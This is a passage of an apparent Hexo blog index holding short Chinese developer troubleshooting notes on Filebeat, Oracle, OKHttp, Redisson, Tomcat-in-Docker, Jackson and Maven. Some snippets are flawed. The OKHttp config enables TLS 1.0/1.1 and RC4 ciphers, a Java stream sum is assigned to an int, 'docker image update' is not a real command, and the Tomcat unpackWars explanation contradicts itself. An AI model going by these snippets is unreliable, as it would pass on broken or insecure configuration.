<h3 id="發生情境"><a href="#發生情境" class="headerlink" title="發生情境"></a>發生情境</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@<span class="built_in">test</span>]<span class="comment"># nohup: appending output to &#x27;nohup.out&#x27;</span></span><br><span class="line"><span class="built_in">nohup</span>: failed to run <span class="built_in">command</span> <span class="string">&#x27;./filebeat&#x27;</span>: Permission denied</span><br><span class="line"></span><br><span class="line">代表filebeat的權限不足需使用以下指令</span><br><span class="line">$ <span class="built_in">chmod</span> +x filebeat</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Filebeat</category>
      </categories>
      <tags>
        <tag>Filebeat</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Solve ORA-02185</title>
    <url>/posts/6569d853/</url>
    <content><![CDATA[<h3 id="How-To-Solve-ORA-02185"><a href="#How-To-Solve-ORA-02185" class="headerlink" title="How To Solve ORA-02185"></a>How To Solve ORA-02185</h3><span id="more"></span>
<p>這篇介紹How To Solve ORA-02185。</p>
<h3 id="process"><a href="#process" class="headerlink" title="process"></a>process</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">SQL Tool display:</span><br><span class="line">[Err] ORA-02185: a token other than WORK follows COMMIT</span><br><span class="line"></span><br><span class="line">原因是commit後面用錯符號 : </span><br><span class="line">從commit: 改成 commit; 即正常</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Oracle</category>
      </categories>
      <tags>
        <tag>Oracle</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Solve Stream Sum Precision Problem</title>
    <url>/posts/bcf1919f/</url>
    <content><![CDATA[<h3 id="How-To-Solve-Stream-Sum-Precision-Problem"><a href="#How-To-Solve-Stream-Sum-Precision-Problem" class="headerlink" title="How To Solve Stream Sum Precision Problem"></a>How To Solve Stream Sum Precision Problem</h3><span id="more"></span>
<p>這篇介紹How To Solve Stream Sum Precision Problem。</p>
<h3 id="有精確度問題的example"><a href="#有精確度問題的example" class="headerlink" title="有精確度問題的example"></a>有精確度問題的example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">int <span class="built_in">sum</span> = persons.stream()</span><br><span class="line">		 .filter(person -&gt; person.getGender() == Person.Gender.MALE)</span><br><span class="line">		 .mapToDouble(Person::getWeight)</span><br><span class="line">		 .<span class="built_in">sum</span>();</span><br><span class="line"></span><br><span class="line">當Weight欄位數值有無窮小數點時，做<span class="built_in">sum</span>運算會有精確度問題。</span><br></pre></td></tr></table></figure>

<h3 id="使用reduce"><a href="#使用reduce" class="headerlink" title="使用reduce"></a>使用reduce</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">int <span class="built_in">sum</span> = persons.stream()</span><br><span class="line">		 .filter(person -&gt; person.getGender() == Person.Gender.MALE)</span><br><span class="line">		 .mapToDouble(Person::getWeight)</span><br><span class="line">		 .reduce((total, weight) -&gt;  BigDecimalUtils.add(total, weight).doubleValue())</span><br><span class="line">		 .getAsDouble();</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Stream</tag>
        <tag>Reduce</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Solve SQLException Auto-Commit Set ON Can Not Use Rollback</title>
    <url>/posts/1a409a40/</url>
    <content><![CDATA[<h3 id="How-To-Solve-SQLException-Auto-Commit-Set-ON-Can-Not-Use-Rollback"><a href="#How-To-Solve-SQLException-Auto-Commit-Set-ON-Can-Not-Use-Rollback" class="headerlink" title="How To Solve SQLException Auto-Commit Set ON Can Not Use Rollback"></a>How To Solve SQLException Auto-Commit Set ON Can Not Use Rollback</h3><span id="more"></span>
<p>這篇介紹How To Solve SQLException Auto-Commit Set ON Can Not Use Rollback.</p>
<h3 id="解決方法"><a href="#解決方法" class="headerlink" title="解決方法"></a>解決方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">因Oracle連線指令是用來連線用</span><br><span class="line">在Oracle11版本不會特別檢查rollback</span><br><span class="line">但Oracle19c版本檢查較嚴謹</span><br><span class="line">故需將沒用到的connection.rollback()拿掉</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Oracle</category>
      </categories>
      <tags>
        <tag>Oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Solve Tomcat Docker Build For Long Time</title>
    <url>/posts/2089f46e/</url>
    <content><![CDATA[<h3 id="Intro-How-To-Solve-Tomcat-Docker-Build-For-Long-Time"><a href="#Intro-How-To-Solve-Tomcat-Docker-Build-For-Long-Time" class="headerlink" title="Intro How To Solve Tomcat Docker Build For Long Time"></a>Intro How To Solve Tomcat Docker Build For Long Time</h3><span id="more"></span>
<p>這篇介紹How To Solve Tomcat Docker Build For Long Time.</p>
<h3 id="發生情境"><a href="#發生情境" class="headerlink" title="發生情境"></a>發生情境</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在使用docker image要啟動 build centOS + tomcat + jdk時，</span><br><span class="line">發現tomcat在啟動時需要花費約7分鐘啟動。</span><br><span class="line"></span><br><span class="line">只會發生用在.WAR檔時，若是用.zip檔去unzip不在此限。</span><br></pre></td></tr></table></figure>

<h3 id="解決方法"><a href="#解決方法" class="headerlink" title="解決方法"></a>解決方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在tomcat /conf/server.xml 有個參數 unpackWars</span><br><span class="line"></span><br><span class="line">參數說明:在執行此webapps時是否先對歸檔</span><br><span class="line">格式的WAR文件解壓縮再運行，設置為<span class="literal">false</span>時則直接執行WAR文件；</span><br><span class="line">default為<span class="literal">true</span>。設置為<span class="literal">false</span>時會損耗性能。</span><br><span class="line"></span><br><span class="line">將unpackWars參數設定為<span class="literal">true</span>，7分鐘會縮減至5s。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Tomcat</tag>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Solve TIME_WAIT &amp; CLOSE_WAIT 過多問題</title>
    <url>/posts/ffb93473/</url>
    <content><![CDATA[<h3 id="Intro-How-To-Solve-TIME-WAIT-amp-CLOSE-WAIT-過多問題"><a href="#Intro-How-To-Solve-TIME-WAIT-amp-CLOSE-WAIT-過多問題" class="headerlink" title="Intro How To Solve TIME_WAIT &amp; CLOSE_WAIT 過多問題"></a>Intro How To Solve TIME_WAIT &amp; CLOSE_WAIT 過多問題</h3><span id="more"></span>
<p>這篇介紹How To Solve TIME_WAIT &amp; CLOSE_WAIT 過多問題。</p>
<h3 id="OKHttp"><a href="#OKHttp" class="headerlink" title="OKHttp"></a>OKHttp</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">增加Conncetion Keepalive使用數量</span><br><span class="line"></span><br><span class="line">ex:</span><br><span class="line">before</span><br><span class="line">OkHttpClient.Builder client = new OkHttpClient.Builder();</span><br><span class="line">client.connectionPool(new ConnectionPool(10, 60, TimeUnit.SECONDS));</span><br><span class="line"></span><br><span class="line">after</span><br><span class="line">OkHttpClient.Builder client = new OkHttpClient.Builder();</span><br><span class="line">client.connectionPool(new ConnectionPool(100, 60, TimeUnit.SECONDS));</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>TCP</category>
      </categories>
      <tags>
        <tag>TCP</tag>
        <tag>OKHttp</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Solve Write Redis Connection Exception</title>
    <url>/posts/1ef3314c/</url>
    <content><![CDATA[<h3 id="How-To-Solve-Write-Redis-Connection-Exception"><a href="#How-To-Solve-Write-Redis-Connection-Exception" class="headerlink" title="How To Solve Write Redis Connection Exception"></a>How To Solve Write Redis Connection Exception</h3><span id="more"></span>
<p>這篇介紹How To Solve Write Redis Connection Exception。</p>
<h3 id="錯誤訊息"><a href="#錯誤訊息" class="headerlink" title="錯誤訊息"></a>錯誤訊息</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Unable to write <span class="built_in">command</span> into connection! Increase connection pool size.</span><br><span class="line">Node <span class="built_in">source</span>: NodeSource [slot=6788, addr=null, redisClient=null, redirect=null,</span><br><span class="line">entry=null], connection: RedisConnection@1298803612 [redisClient=[addr=redis:</span><br><span class="line">//x.x.x.x:8000], channel=[<span class="built_in">id</span>: 0xb80b5701, L:/x.x.x.x:56580 ! R:x.x.x.x/x.x.x.x</span><br><span class="line">:8000], currentCommand=null, usage=1], <span class="built_in">command</span>: (EVAL), params: [<span class="built_in">local</span> v = </span><br><span class="line">redis.call(<span class="string">&#x27;hget&#x27;</span>, KEYS[1], ARGV[1]); redis.call(<span class="string">&#x27;hset&#x27;</span>, KEYS[1], ARGV[1],</span><br><span class="line">ARGV[2]); retur..., 1, baccarat:staging:monitorcache, PooledUnsafeDirectByteBuf</span><br><span class="line">(ridx: 0, widx: 119, <span class="built_in">cap</span>: 256), PooledUnsafeDirectByteBuf(ridx: 0, widx: 217, </span><br><span class="line"><span class="built_in">cap</span>: 256)] after 3 retry attempts</span><br><span class="line">org.redisson.client.WriteRedisConnectionException: Unable to write <span class="built_in">command</span> into</span><br><span class="line">connection! Increase connection pool size. Node <span class="built_in">source</span>: NodeSource [slot=6788,</span><br><span class="line">addr=null, redisClient=null, redirect=null, entry=null], connection: </span><br></pre></td></tr></table></figure>

<h3 id="官方提供解決方案"><a href="#官方提供解決方案" class="headerlink" title="官方提供解決方案"></a>官方提供解決方案</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">There are four main reasons:</span><br><span class="line"></span><br><span class="line">All netty threads are busy, leading to delays <span class="keyword">in</span> both Redis response decoding </span><br><span class="line">and sending commands to Redis All connections are busy</span><br><span class="line">Redis server takes too long to respond the request.</span><br><span class="line">Sync methods invocation <span class="keyword">in</span> async/reactive/rx listeners.</span><br><span class="line">First try to <span class="built_in">set</span> follow values <span class="keyword">for</span> nettyThreads setting: 32, 64, 128, 256 this</span><br><span class="line">allow Redisson to get free netty thread to decode response or send <span class="built_in">command</span>.</span><br><span class="line"> Next, try to increase retryInterval and/or </span><br><span class="line"><span class="built_in">timeout</span> to a reasonable value so that a <span class="built_in">command</span> can still gracefully fail </span><br><span class="line">without having the end user <span class="built_in">wait</span> forever. At the last step, try to increase</span><br><span class="line"> connection pool setting so that Redisson can stand </span><br><span class="line">a better chance <span class="keyword">in</span> getting a free connection.</span><br><span class="line"></span><br><span class="line">Complex commands such as keys, hmget and big loops <span class="keyword">in</span> Lua scripts are</span><br><span class="line">more likely to see it than other commands. It is important to understand</span><br><span class="line"> an operation can still <span class="built_in">timeout</span> despite the absence </span><br><span class="line">of it from the Redis slowlog. Slowlogs only record the time a <span class="built_in">command</span> </span><br><span class="line">is been processed by the Redis event loop and not anything before or after.</span><br><span class="line">Network issue may also cause this exception </span><br><span class="line">when a response is still in-flight.</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Redisson</category>
      </categories>
      <tags>
        <tag>Redisson</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Solve Unrecognized Option ALL-UNNAMED On Eclipse 2023-03</title>
    <url>/posts/1d14e482/</url>
    <content><![CDATA[<h3 id="How-To-Solve-Unrecognized-Option-ALL-UNNAMED-On-Eclipse-2023-03"><a href="#How-To-Solve-Unrecognized-Option-ALL-UNNAMED-On-Eclipse-2023-03" class="headerlink" title="How To Solve Unrecognized Option ALL-UNNAMED On Eclipse 2023-03"></a>How To Solve Unrecognized Option ALL-UNNAMED On Eclipse 2023-03</h3><span id="more"></span>
<p>這篇介紹How To Solve Unrecognized Option ALL-UNNAMED On Eclipse 2023-03。</p>
<h3 id="Step-by-step"><a href="#Step-by-step" class="headerlink" title="Step by step"></a>Step by step</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Error message : Unrecognized option: --add-opens=java.base/java.lang=ALL-UNNAMED</span><br><span class="line"></span><br><span class="line">1.因jre選到預設的 要改選自己安裝的jre path</span><br><span class="line">2.移除原tomcat設定 重新設定並把1選擇正確的jre path</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Eclipse</category>
      </categories>
      <tags>
        <tag>JDK</tag>
        <tag>Eclipse</tag>
        <tag>Jre</tag>
      </tags>
  </entry>
  <entry>
    <title>One or more listeners failed to start</title>
    <url>/posts/e79731f5/</url>
    <content><![CDATA[<h3 id="How-To-Solve-org-apache-catalina-core-StandardContext-startInternal-One-or-more-listeners-failed-to-start"><a href="#How-To-Solve-org-apache-catalina-core-StandardContext-startInternal-One-or-more-listeners-failed-to-start" class="headerlink" title="How To Solve org.apache.catalina.core.StandardContext.startInternal One or more listeners failed to start"></a>How To Solve org.apache.catalina.core.StandardContext.startInternal One or more listeners failed to start</h3><span id="more"></span>
<p>這篇介紹How To Solve org.apache.catalina.core.StandardContext.startInternal One or more listeners failed to start。</p>
<h3 id="發生情境"><a href="#發生情境" class="headerlink" title="發生情境"></a>發生情境</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Tomcat啟動時在catalina.out出現以下<span class="built_in">log</span></span><br><span class="line">03-Aug-2021 12:10:49.061 SEVERE [localhost-startStop-1] org.apache.catalina.core.StandardContext.startInternal One or more listeners failed to start</span><br><span class="line">. Full details will be found <span class="keyword">in</span> the appropriate container <span class="built_in">log</span> file</span><br><span class="line">03-Aug-2021 12:10:49.062 SEVERE [localhost-startStop-1] org.apache.catalina.core.StandardContext.startInternal Context [] startup failed due to prev</span><br><span class="line">ious errors</span><br></pre></td></tr></table></figure>

<h3 id="解決方法"><a href="#解決方法" class="headerlink" title="解決方法"></a>解決方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在catalina.out同目錄下的localhost.yyyy-MM-dd.log</span><br><span class="line">會有詳細出錯的Log可以查看</span><br><span class="line"></span><br><span class="line">memo:遇過classNotFoundException</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>class</category>
      </categories>
      <tags>
        <tag>class</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Solve java lang IllegalStateException: closed</title>
    <url>/posts/2ac40635/</url>
    <content><![CDATA[<h3 id="How-To-Solve-java-lang-IllegalStateException-closed"><a href="#How-To-Solve-java-lang-IllegalStateException-closed" class="headerlink" title="How To Solve java.lang.IllegalStateException.closed"></a>How To Solve java.lang.IllegalStateException.closed</h3><span id="more"></span>
<p>這篇介紹How To Solve java.lang.IllegalStateException: closed。</p>
<h3 id="發生情境"><a href="#發生情境" class="headerlink" title="發生情境"></a>發生情境</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">使用OKHttp時，若使用一次以上的response.body().string();</span><br><span class="line">則會出現java.lang.IllegalStateException: closed 錯誤訊息。</span><br></pre></td></tr></table></figure>

<h3 id="解決方法"><a href="#解決方法" class="headerlink" title="解決方法"></a>解決方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">使用變數儲存，避免重複使用一次以上</span><br><span class="line">String response = response.body().string();</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>OKHttp</category>
      </categories>
      <tags>
        <tag>OKHttp</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Update Docker Image Version</title>
    <url>/posts/74b8cacf/</url>
    <content><![CDATA[<h3 id="How-To-Update-Docker-Image-Version"><a href="#How-To-Update-Docker-Image-Version" class="headerlink" title="How To Update Docker Image Version"></a>How To Update Docker Image Version</h3><span id="more"></span>
<p>這篇介紹How To Update Docker Image Version。</p>
<h3 id="過程"><a href="#過程" class="headerlink" title="過程"></a>過程</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ docker image update</span><br><span class="line"></span><br><span class="line">$ docker-compose down</span><br><span class="line"></span><br><span class="line">$ docker image <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line">$ docker pull &#123;REPOSITORY&#125;:&#123;TAG&#125;</span><br><span class="line"></span><br><span class="line">$ docker rmi &#123;IMAGE ID&#125;</span><br><span class="line"></span><br><span class="line">$ docker-compose up -d</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>DockerCompose</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Test OSI Network Layer To Application Layer Is Work?</title>
    <url>/posts/fdd7fe05/</url>
    <content><![CDATA[<h3 id="How-To-Test-OSI-Network-Layer-To-Application-Layer-Is-Work"><a href="#How-To-Test-OSI-Network-Layer-To-Application-Layer-Is-Work" class="headerlink" title="How To Test OSI Network Layer To Application Layer Is Work?"></a>How To Test OSI Network Layer To Application Layer Is Work?</h3><span id="more"></span>
<p>這篇介紹How To Test OSI Network Layer To Application Layer Is Work?。</p>
<h3 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ Ping 127.0.0.1 </span><br><span class="line">有正常回應代表Network layer 至 Application layer 正常運作</span><br><span class="line"></span><br><span class="line">Ping只能測試Application layer 至 Network layer，</span><br><span class="line">至於Physical layer和 Datalink layer，是網路卡的測試!</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>Network</tag>
        <tag>Ping</tag>
        <tag>OSI</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Use JsonMapper Replace ObjectMapper</title>
    <url>/posts/d05b75b3/</url>
    <content><![CDATA[<h3 id="How-To-Use-JsonMapper-Replace-ObjectMapper"><a href="#How-To-Use-JsonMapper-Replace-ObjectMapper" class="headerlink" title="How To Use JsonMapper Replace ObjectMapper"></a>How To Use JsonMapper Replace ObjectMapper</h3><span id="more"></span>
<p>這篇介紹How To Use JsonMapper Replace ObjectMapper。</p>
<h3 id="before"><a href="#before" class="headerlink" title="before"></a>before</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">protected final static ObjectMapper mapper = new ObjectMapper();</span><br><span class="line">protected final static JsonFactory jsonFactory;</span><br><span class="line"></span><br><span class="line">static &#123;</span><br><span class="line">	jsonFactory = mapper.getFactory();</span><br><span class="line">	mapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, <span class="literal">false</span>);</span><br><span class="line">	mapper.configure(JsonParser.Feature.AUTO_CLOSE_SOURCE, <span class="literal">false</span>);</span><br><span class="line">	mapper.configure(JsonGenerator.Feature.AUTO_CLOSE_TARGET, <span class="literal">false</span>);</span><br><span class="line">	mapper.configure(JsonGenerator.Feature.FLUSH_PASSED_TO_STREAM, <span class="literal">false</span>);</span><br><span class="line">	mapper.configure(SerializationFeature.WRITE_NULL_MAP_VALUES, <span class="literal">false</span>);</span><br><span class="line">	DateFormat DATE_FORMAT_ISO8601 = new SimpleDateFormat(<span class="string">&quot;yyyy-MM-dd&#x27;T&#x27;HH:mm:ss.SSSZ&quot;</span>);</span><br><span class="line">	DATE_FORMAT_ISO8601.setTimeZone(TimeZone.getTimeZone(<span class="string">&quot;Asia/Taipei&quot;</span>));</span><br><span class="line">	mapper.setDateFormat(DATE_FORMAT_ISO8601);</span><br><span class="line">	mapper.configure(DeserializationFeature.ACCEPT_SINGLE_VALUE_AS_ARRAY, <span class="literal">true</span>);</span><br><span class="line">	mapper.configure(MapperFeature.DEFAULT_VIEW_INCLUSION, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="after"><a href="#after" class="headerlink" title="after"></a>after</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">protected static JsonMapper mapper;</span><br><span class="line">protected final static JsonFactory jsonFactory;</span><br><span class="line"></span><br><span class="line">static &#123;</span><br><span class="line">	DateFormat DATE_FORMAT_ISO8601 = new SimpleDateFormat(<span class="string">&quot;yyyy-MM-dd&#x27;T&#x27;HH:mm:ss.SSSZ&quot;</span>);</span><br><span class="line">	DATE_FORMAT_ISO8601.setTimeZone(TimeZone.getTimeZone(<span class="string">&quot;Asia/Taipei&quot;</span>));</span><br><span class="line">	mapper = JsonMapper.builder().configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, <span class="literal">false</span>)</span><br><span class="line">			.configure(JsonParser.Feature.AUTO_CLOSE_SOURCE, <span class="literal">false</span>)</span><br><span class="line">			.configure(JsonGenerator.Feature.AUTO_CLOSE_TARGET, <span class="literal">false</span>)</span><br><span class="line">			.configure(JsonGenerator.Feature.FLUSH_PASSED_TO_STREAM, <span class="literal">false</span>)</span><br><span class="line">			.configure(DeserializationFeature.ACCEPT_SINGLE_VALUE_AS_ARRAY, <span class="literal">true</span>)</span><br><span class="line">			.configure(MapperFeature.DEFAULT_VIEW_INCLUSION, <span class="literal">false</span>)</span><br><span class="line">			.serializationInclusion(Include.NON_NULL).defaultDateFormat(DATE_FORMAT_ISO8601).build();</span><br><span class="line">	jsonFactory = mapper.getFactory();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>jackson</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Use Different Dependencies On Profile</title>
    <url>/posts/884dfd8f/</url>
    <content><![CDATA[<h3 id="Intro-How-To-Use-Different-Dependencies-On-Profile"><a href="#Intro-How-To-Use-Different-Dependencies-On-Profile" class="headerlink" title="Intro How To Use Different Dependencies On Profile"></a>Intro How To Use Different Dependencies On Profile</h3><span id="more"></span>
<p>這篇介紹How To Use Different Dependencies On Profile.</p>
<h3 id="使用情境"><a href="#使用情境" class="headerlink" title="使用情境"></a>使用情境</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在不同環境佈署時，欲使用不同的版本來運作。</span><br><span class="line">可使用</span><br><span class="line">&lt;profiles&gt;</span><br><span class="line">    &lt;profile&gt;</span><br><span class="line">        &lt;<span class="built_in">id</span>&gt;debug&lt;/id&gt;</span><br><span class="line">        …</span><br><span class="line">        &lt;dependencies&gt;</span><br><span class="line">            &lt;dependency&gt;…&lt;/dependency&gt;</span><br><span class="line">        &lt;/dependencies&gt;</span><br><span class="line">        …</span><br><span class="line">    &lt;/profile&gt;</span><br><span class="line">    &lt;profile&gt;</span><br><span class="line">        &lt;<span class="built_in">id</span>&gt;release&lt;/id&gt;</span><br><span class="line">        …</span><br><span class="line">        &lt;dependencies&gt;</span><br><span class="line">            &lt;dependency&gt;…&lt;/dependency&gt;</span><br><span class="line">        &lt;/dependencies&gt;</span><br><span class="line">        …</span><br><span class="line">    &lt;/profile&gt;</span><br><span class="line">&lt;/profiles&gt;</span><br><span class="line">來指定Maven bulid來產生相對應不同的版本。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Maven</category>
      </categories>
      <tags>
        <tag>Maven</tag>
        <tag>Pom</tag>
        <tag>Dependencies</tag>
        <tag>Profile</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Use OKHttp Support TLS1.2 Version</title>
    <url>/posts/d3cb8ac9/</url>
    <content><![CDATA[<h3 id="How-To-Use-OKHttp-Support-TLS1-2-Version"><a href="#How-To-Use-OKHttp-Support-TLS1-2-Version" class="headerlink" title="How To Use OKHttp Support TLS1.2 Version"></a>How To Use OKHttp Support TLS1.2 Version</h3><span id="more"></span>
<p>這篇介紹How To Use OKHttp Support TLS1.2 Version.</p>
<h3 id="OKHttp-init"><a href="#OKHttp-init" class="headerlink" title="OKHttp init"></a>OKHttp init</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ConnectionSpec spec = new ConnectionSpec.Builder(ConnectionSpec.COMPATIBLE_TLS)</span><br><span class="line">	.supportsTlsExtensions(<span class="literal">true</span>)</span><br><span class="line">	.tlsVersions(TlsVersion.TLS_1_2, TlsVersion.TLS_1_1, TlsVersion.TLS_1_0)</span><br><span class="line">	.cipherSuites(</span><br><span class="line">			CipherSuite.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,</span><br><span class="line">			CipherSuite.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,</span><br><span class="line">			CipherSuite.TLS_DHE_RSA_WITH_AES_128_GCM_SHA256,</span><br><span class="line">			CipherSuite.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA,</span><br><span class="line">			CipherSuite.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA,</span><br><span class="line">			CipherSuite.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,</span><br><span class="line">			CipherSuite.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,</span><br><span class="line">			CipherSuite.TLS_ECDHE_ECDSA_WITH_RC4_128_SHA,</span><br><span class="line">			CipherSuite.TLS_ECDHE_RSA_WITH_RC4_128_SHA,</span><br><span class="line">			CipherSuite.TLS_DHE_RSA_WITH_AES_128_CBC_SHA,</span><br><span class="line">			CipherSuite.TLS_DHE_DSS_WITH_AES_128_CBC_SHA,</span><br><span class="line">			CipherSuite.TLS_DHE_RSA_WITH_AES_256_CBC_SHA)</span><br><span class="line">	.build();</span><br><span class="line">	</span><br><span class="line">client = newClient.connectionSpecs(Collections.singletonList(spec)).build();</span><br><span class="line"></span><br><span class="line">預設沒有<span class="built_in">enable</span> TLS1.2，要在OKHttp init時加入設定。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>OKHttp</category>
      </categories>
      <tags>
        <tag>OKHttp</tag>
        <tag>TLS1.2</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Update Git Version</title>
    <url>/posts/f4e089b4/</url>
    <content><![CDATA[<h2 id="How-To-Update-Git-Version"><a href="#How-To-Update-Git-Version" class="headerlink" title="How To Update Git Version"></a>How To Update Git Version</h2><span id="more"></span>
<p>這篇介紹如何透過command line指令升級Git version。</p>
<h2 id="instruction"><a href="#instruction" class="headerlink" title="instruction:"></a>instruction:</h2><p>若目前的版本是 2.16.1 以上，請使用<br>$ git update-git-for-windows<br>進行升級</p>
]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Use OKHttp For Java</title>
    <url>/posts/1b61d8ee/</url>
    <content><![CDATA[<h3 id="How-To-Use-OKHttp-For-Java"><a href="#How-To-Use-OKHttp-For-Java" class="headerlink" title="How To Use OKHttp For Java"></a>How To Use OKHttp For Java</h3><span id="more"></span>
<p>這篇介紹How To Use OKHttp For Java。</p>
<h3 id="Maven-add-dependency-in-pom-xml"><a href="#Maven-add-dependency-in-pom-xml" class="headerlink" title="Maven:add dependency in pom.xml"></a>Maven:add dependency in pom.xml</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&lt;!-- https://mvnrepository.com/artifact/com.squareup.okhttp3/okhttp --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.squareup.okhttp3&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;okhttp&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;4.9.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<h3 id="get-example"><a href="#get-example" class="headerlink" title="get example"></a>get example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Synchronous:</span><br><span class="line">private final OkHttpClient client = new OkHttpClient();</span><br><span class="line">public void SynchronousGet() throws Exception &#123;</span><br><span class="line">    Request request = new Request.Builder()</span><br><span class="line">        .url(<span class="string">&quot;https://publicobject.com/helloworld.txt&quot;</span>)</span><br><span class="line">        .build();</span><br><span class="line"></span><br><span class="line">    try (Response response = client.newCall(request).execute()) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!response.isSuccessful()) throw new IOException(<span class="string">&quot;Unexpected code &quot;</span> + response);</span><br><span class="line"></span><br><span class="line">      Headers responseHeaders = response.headers();</span><br><span class="line">      <span class="keyword">for</span> (int i = 0; i &lt; responseHeaders.size(); i++) &#123;</span><br><span class="line">        System.out.println(responseHeaders.name(i) + <span class="string">&quot;: &quot;</span> + responseHeaders.value(i));</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      System.out.println(response.body().string());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Asynchronous:</span><br><span class="line">public void AsynchronousGet() throws Exception &#123;</span><br><span class="line">    Request request = new Request.Builder()</span><br><span class="line">        .url(<span class="string">&quot;http://publicobject.com/helloworld.txt&quot;</span>)</span><br><span class="line">        .build();</span><br><span class="line"></span><br><span class="line">    client.newCall(request).enqueue(new <span class="function"><span class="title">Callback</span></span>() &#123;</span><br><span class="line">      @Override </span><br><span class="line">	  public void onFailure(Call call, IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      @Override </span><br><span class="line">	  public void onResponse(Call call, Response response) throws IOException &#123;</span><br><span class="line">        try (ResponseBody responseBody = response.body()) &#123;</span><br><span class="line">          <span class="keyword">if</span> (!response.isSuccessful()) throw new IOException(<span class="string">&quot;Unexpected code &quot;</span> + response);</span><br><span class="line"></span><br><span class="line">          Headers responseHeaders = response.headers();</span><br><span class="line">          <span class="keyword">for</span> (int i = 0, size = responseHeaders.size(); i &lt; size; i++) &#123;</span><br><span class="line">            System.out.println(responseHeaders.name(i) + <span class="string">&quot;: &quot;</span> + responseHeaders.value(i));</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          System.out.println(responseBody.string());</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

